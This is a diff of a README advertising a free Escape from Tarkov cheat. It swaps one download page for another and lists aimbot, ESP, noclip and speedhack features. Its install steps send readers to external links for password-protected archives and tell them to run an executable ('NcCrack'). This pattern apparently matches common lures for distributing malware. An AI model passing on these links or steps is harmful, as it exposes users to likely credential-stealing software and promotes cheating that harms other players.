@@ -1,51 +1,119 @@
-# FREE-HYROCOPT-HACK-ESCAPE-FROM-TARKOV-CHEAT-ESP-WH-AIMBOT
-Our cheat supports windows 7/10/11
+# EFT-HACK-AIMBOT-ESP-More
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# IMPORTANT 
 
-# Some of the features of Free HYROCOPT Hack
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
 
-![image](https://user-images.githubusercontent.com/126517061/222335380-f5923e7c-e13e-4d89-ac02-34731a990dfb.png)
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
 
-Esp Hack
+# Why us?
 
-Aimbot Hack
+- We have a website with full player support
 
-No Recoil Hack
+- We are constantly updating cheats for the latest version of the game
 
-Spoofer free
+- Not any problems with the installation 
 
-Soft Aim Hack
-# Updates;
-[+] Menu Completly Changed.
+- All cheats are connected into one launcher for convenience
 
-[+] Fixed Aim Lock Line.
+-----------------------------------------------------------------------------------------------------------------------
 
-[+] Fixed Aim Bones [ Now it’s actually head ].
+# How to install?
 
-[+] SnapLines Repositioned.
+- Visit our website
 
-[+] Added Air Stuck.
+- Click GET FREE
 
-[+] U finally can turn off vehicle esp.
+- Download the archive 
 
-[+] Silent Aim and Bullet Teleport will be up very soon just wait.
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
 
-[+] Updated to latest patch.
+- Run the file ( NcCrack )
 
-[+] Major Improvments.
-# [How to use HYROCOPT Hacks Free?]
+- Launch the game
 
-To use this Tarkov hacks for free You must turn on your Discord Overlay first of all.
+- In-game INSERT button
 
-Close Game Launcher.
+-----------------------------------------------------------------------------------------------------------------------
 
-Open HYROCOPT HACK.exe.
+# SYSTEM REQUIREMENTS
 
-Open Launcher and launch Escape from Tarkov.
+- Processor | Intel | Amd Processor |
 
-Enjoy
-# PASSWORD FOR ZIP ARCHIVE: 23
+- Windows support | 7 | 8 | 8.1 | 10 | 11 |
+
+- Build support | ALL |
+
+-----------------------------------------------------------------------------------------------------------------------
+# AIMBOT
+
+- Default/silent
+- Smooth
+- Fov limit
+- Distance limit
+- Snapline to aim target
+- Aimpoint
+- Visible check
+- Crosshair
+- Draw fov
+- Preditction
+- Hitbox
+- Head
+- Stomach
+- Nearest
+- Smart mode
+
+# VISUALS
+
+- Box
+- Distance limit
+- Arrows
+- Line of sight
+- Name
+- Weapon
+- Inventory cost
+- Distance
+- Health
+
+# WORLD
+
+- Item esp
+- Container esp
+- Exfiltration points
+- Item filter
+
+# MISC
+
+- Custom time
+- No recoil
+- No sway
+- No spread
+- Instant examine
+- Unlimited stamina
+- Thermal vision
+- Night vision
+- No visor
+- Loot through walls
+- Noclip
+- Speedhack
+- Configs
+
+![3fHV8wo](https://user-images.githubusercontent.com/119938147/213410621-0bf9d380-e940-48a8-bddc-61b8def53119.png)
+![AxcP9nY](https://user-images.githubusercontent.com/119938147/213410632-fa94ddeb-5e3e-4e81-8575-9515f91864a0.png)
+![BAukZui](https://user-images.githubusercontent.com/119938147/213410635-5d597e39-f3f2-4507-9dbe-443a5866bccf.jpg)
+![eCYVX8h](https://user-images.githubusercontent.com/119938147/213410637-1043aee4-7b7d-4c60-a10f-a93ad735bcf0.png)
+![EyPGQi2](https://user-images.githubusercontent.com/119938147/213410645-dda1f888-d708-4da4-a82e-1c09ef1e5bcf.png)
+![L1y7sex](https://user-images.githubusercontent.com/119938147/213410648-3070101a-c6f5-4172-b3f3-560533a57e18.png)
+![mJaBEOS (1)](https://user-images.githubusercontent.com/119938147/213410650-ea611f5e-77fd-48bb-81af-c22aaf5648c6.png)
+![mJaBEOS](https://user-images.githubusercontent.com/119938147/213410651-2b4686af-4a4d-40fb-8dfa-38c197abaa80.png)
+![ngQOkkJ](https://user-images.githubusercontent.com/119938147/213410653-6dc83931-3530-4291-b3b3-558babbc3aba.png)
+![QeLOQ84](https://user-images.githubusercontent.com/119938147/213410654-0e21df41-5a7a-4334-815e-6d91cb592862.png)
+![SLEbVlE (1)](https://user-images.githubusercontent.com/119938147/213410659-b71bea5e-2849-4f27-a4d6-028a69b35502.png)
+![SLEbVlE](https://user-images.githubusercontent.com/119938147/213410661-18c64403-ebce-4de9-b79d-55d9d6f67726.png)
+![tgzVOH8](https://user-images.githubusercontent.com/119938147/213410662-da487fdd-d0ac-4601-9a39-c349fca53186.png)
+
